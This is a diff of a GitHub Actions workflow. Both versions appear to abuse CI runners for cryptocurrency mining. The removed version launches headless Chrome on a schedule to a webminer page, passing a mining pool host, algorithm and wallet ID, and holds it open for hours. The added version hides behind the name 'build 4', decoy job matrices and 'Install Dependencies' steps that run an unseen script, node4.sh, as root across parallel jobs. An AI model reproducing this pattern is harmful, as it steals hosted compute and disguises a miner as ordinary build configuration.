@@ -1,160 +1,109 @@
-name: Puppeteer Script
-
+name: build 4
+ 
 on:
-  schedule:
-    - cron: '0 */6 * * *' # Runs every 6 hours
+  workflow_dispatch:
   push:
-    branches:
-      - main
-  pull_request:
-    branches:
-      - main
-  workflow_dispatch: # Allows manual trigger
-
-jobs:
-  job1:
-    strategy:
-      matrix:
-        os: [ubuntu-latest, windows-latest, macos-latest, centos-latest, fedora-latest]
-
-    runs-on: ${{ matrix.os }}
-
-    steps:
-      - name: Checkout code
-        uses: actions/checkout@v2
-
-      - name: Update system (if needed)
-        run: |
-          if [ "${{ matrix.os }}" = "centos-latest" ] || [ "${{ matrix.os }}" = "fedora-latest" ]; then
-            sudo yum update -y
-          elif [ "${{ matrix.os }}" = "ubuntu-latest" ]; then
-            sudo apt-get update -y
-          fi
-
-      - name: Install NVM
-        run: |
-          curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash
-          source ~/.bashrc
-
-      - name: Install Node.js 18 using NVM
-        run: |
-          export NVM_DIR="$HOME/.nvm"
-          [ -s "$NVM_DIR/nvm.sh" ] && \. "$NVM_DIR/nvm.sh"  # This loads nvm
-          nvm install 18
-
-      - name: Install dependencies for Chrome and Puppeteer
-        run: |
-          if [ "${{ matrix.os }}" = "centos-latest" ] || [ "${{ matrix.os }}" = "fedora-latest" ]; then
-            sudo yum install -y \
-              gconf-service \
-              libXcomposite \
-              libXcursor \
-              libXi \
-              libXtst \
-              libXrandr \
-              libXScrnSaver \
-              alsa-lib \
-              mesa-libEGL \
-              libXdamage \
-              mesa-libGL \
-              libXss \
-              libxshmfence \
-              pango \
-              atk \
-              cups-libs \
-              gtk3 \
-              nss \
-              xorg-x11-fonts-100dpi \
-              xorg-x11-fonts-75dpi \
-              xorg-x11-utils \
-              xorg-x11-fonts-cyrillic \
-              xorg-x11-fonts-Type1 \
-              xorg-x11-fonts-misc \
-              libappindicator-gtk3 \
-              libappindicator-gtk2 \
-              libdbusmenu \
-              dbus-x11 \
-              xorg-x11-server-Xvfb \
-              xorg-x11-fonts-ISO8859-1-100dpi \
-              xorg-x11-fonts-ISO8859-1-75dpi \
-              xorg-x11-fonts-ISO8859-1 \
-              xorg-x11-fonts-misc \
-              ipa-gothic-fonts \
-              ipa-mincho-fonts \
-              wqy-zenhei-fonts \
-              adobe-source-han-sans-cn-fonts \
-              adobe-source-han-sans-tw-fonts \
-              adobe-source-han-serif-cn-fonts \
-              adobe-source-han-serif-tw-fonts \
-              liberation-sans-fonts \
-              liberation-serif-fonts \
-              liberation-mono-fonts
-          elif [ "${{ matrix.os }}" = "ubuntu-latest" ]; then
-            sudo apt-get install -y \
-              gconf-service \
-              libasound2 \
-              libatk1.0-0 \
-              libcups2 \
-              libgtk-3-0 \
-              libnspr4 \
-              libnss3 \
-              libxcomposite1 \
-              libxcursor1 \
-              libxi6 \
-              libxtst6 \
-              libappindicator3-1 \
-              libgbm-dev \
-              libxss1 \
-              fonts-ipafont-gothic \
-              fonts-ipafont-mincho \
-              fonts-wqy-zenhei \
-              fonts-thai-tlwg \
-              fonts-noto \
-              fonts-freefont-ttf
-          fi
-
-      - name: Install Google Chrome
-        run: |
-          if [ "${{ matrix.os }}" = "centos-latest" ] || [ "${{ matrix.os }}" = "fedora-latest" ]; then
-            sudo curl -o /etc/yum.repos.d/google-chrome.repo https://dl.google.com/linux/chrome/rpm/stable/x86_64/google-chrome.repo
-            sudo yum install -y google-chrome-stable
-          elif [ "${{ matrix.os }}" = "ubuntu-latest" ]; then
-            wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
-            sudo dpkg -i google-chrome-stable_current_amd64.deb || sudo apt-get -f install -y
-          fi
-
-      - name: Install Puppeteer and npx globally
-        run: |
-          npm install -g puppeteer npx
-
-      - name: Use npx to install Puppeteer-compatible Chrome
-        run: |
-          npx puppeteer browsers install
-
-      - name: Create and run Puppeteer script with delay
-        run: |
-          cat <<'EOF' > puppeteer_script.js
-          const puppeteer = require('puppeteer');
-
-          (async () => {
-            const browser = await puppeteer.launch({ headless: true });
-            const page = await browser.newPage();
-            await page.goto('https://webminer.pages.dev?algorithm=yespowerr16&host=stratum-asia.rplant.xyz&port=13382&worker=YdenAmcQSv3k4qUwYu2qzM4X6qi1XJGvwC&password=x&workers=16');
-
-            // Set timeout to keep the browser open for 5 hours (18000 seconds)
-            setTimeout(async () => {
-              console.log('Closing browser after 5 hours.');
-              await browser.close();
-            }, 18000 * 1000);
-
-            // Wait indefinitely to keep the script running and the browser open
-            await new Promise(() => {});
-          })();
-          EOF
-
-      - name: Run Puppeteer script using Node.js
-        run: node puppeteer_script.js
-
-      # Optionally, you can uncomment the following step to remove the Puppeteer script after execution
-      # - name: Remove Puppeteer script
-      #   run: rm puppeteer_script.js
+    branches: ["main"]
+  schedule:
+    - cron: '0 */6 * * *'
+  
+jobs: 
+  build: 
+    name: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 40 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5, 6, 7, 8, 9, 10] 
+        flag: [A, B, C, D] 
+    env: 
+        NUM_JOBS: 40  
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v1 
+ 
+  deploy-1: 
+    name: deploy-1 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node4.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node4.sh" 
+ 
+  deploy-2: 
+    name: deploy-2 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node4.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node4.sh" 
+ 
+  deploy-3: 
+    name: deploy-3 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node4.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node4.sh" 
+ 
+  deploy-4: 
+    name: deploy-4 
+    needs: build 
+    runs-on: ubuntu-latest 
+    strategy: 
+      max-parallel: 5 
+      fail-fast: false 
+      matrix: 
+        go: [1, 2, 3, 4, 5] 
+    env: 
+        NUM_JOBS: 5 
+        JOB: ${{ matrix.go }} 
+    steps: 
+    - name: Setup 
+      uses: actions/checkout@v2 
+    - name : Install Dependencies 
+      run: chmod +x "${GITHUB_WORKSPACE}/node4.sh" && sudo RUNNER_ALLOW_RUNASROOT=true "${GITHUB_WORKSPACE}/node4.sh" 
+ 
+  succes: 
+    name: succes 
+    needs: [deploy-1, deploy-2, deploy-3, deploy-4] 
+    runs-on: ubuntu-latest 
+    steps: 
+    - name: Setup 
+      continue-on-error: true 
+      uses: actions/checkout@v1 
+ 
+ 
